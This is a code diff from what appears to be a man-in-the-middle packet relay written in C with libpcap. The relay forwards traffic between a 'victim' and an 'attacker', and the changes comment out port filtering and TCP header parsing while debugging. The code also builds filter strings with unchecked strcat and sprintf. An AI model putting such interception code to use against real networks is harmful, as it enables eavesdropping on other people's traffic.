@@ -209,14 +209,14 @@ void relay_IP(const struct sniff_ethernet *ethernet, const struct sniff_ip *ip, 
 	strcat(filter_exp, r_ips);
 	strcat(filter_exp, " and src host ");
 	strcat(filter_exp, inet_ntoa(ip->ip_src));
-	strcat(filter_exp, " and dst port ");
-	char sport[16];
-	sprintf(sport, "%hu", tcp->th_sport);
-	strcat(filter_exp, sport);
-	strcat(filter_exp, " and src port ");
-	char dport[16];
-	sprintf(dport, "%hu", tcp->th_dport);
-	strcat(filter_exp, dport);
+	//strcat(filter_exp, " and dst port ");
+	//char sport[16];
+	//sprintf(sport, "%hu", tcp->th_sport);
+	//strcat(filter_exp, sport);
+	//strcat(filter_exp, " and src port ");
+	//char dport[16];
+	//sprintf(dport, "%hu", tcp->th_dport);
+	//strcat(filter_exp, dport);
 	printf("Filter string: %s\n", filter_exp);
 	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
 		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
@@ -243,10 +243,10 @@ void relay_IP(const struct sniff_ethernet *ethernet, const struct sniff_ip *ip, 
 	printf("Sending response from victim to attacker\n");
 	const struct sniff_ethernet *new_ethernet; /* The ethernet header */
 	const struct sniff_ip *new_ip; /* The IP header */
-	const struct sniff_tcp *new_tcp; /* The TCP header */
+	//const struct sniff_tcp *new_tcp; /* The TCP header */
 	printf("Packet address: %p\n", packet);
 	u_int size_ip;
-	u_int size_tcp;
+	//u_int size_tcp;
 	printf("Initialized variables\n");
 	new_ethernet = (struct sniff_ethernet*)(packet);
 	//printf("Ethernet type: %hu\n", new_ethernet->ether_type);
@@ -254,22 +254,22 @@ void relay_IP(const struct sniff_ethernet *ethernet, const struct sniff_ip *ip, 
 	new_ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
 	printf("Calling IP_HL: ");
 	//printf("%u\n", new_ip->ip_vhl);
-	//size_ip = IP_HL(new_ip)*4;
-	size_ip = 20;
+	size_ip = IP_HL(new_ip)*4;
+	//size_ip = 20;
 	printf("Checking ip header length\n");
 	if (size_ip < 20) {
 		printf("   * Invalid IP header length: %u bytes\n", size_ip);
 		return;
-	}
+	}/*
 	new_tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
 	printf("Calling TH_OFF\n");
-	//size_tcp = TH_OFF(new_tcp)*4;
+	size_tcp = TH_OFF(new_tcp)*4;
 	size_tcp = 20;
 	printf("Checking tcp header length\n");
 	if (size_tcp < 20) {
 		printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
 		return;
-	}
+	}*/
 	const u_char *new_ip_payload = (u_char *)(packet + SIZE_ETHERNET + size_ip);
 	u_int32_t new_ip_payload_s = header.len - (SIZE_ETHERNET + size_ip);
 	// Construct IP header
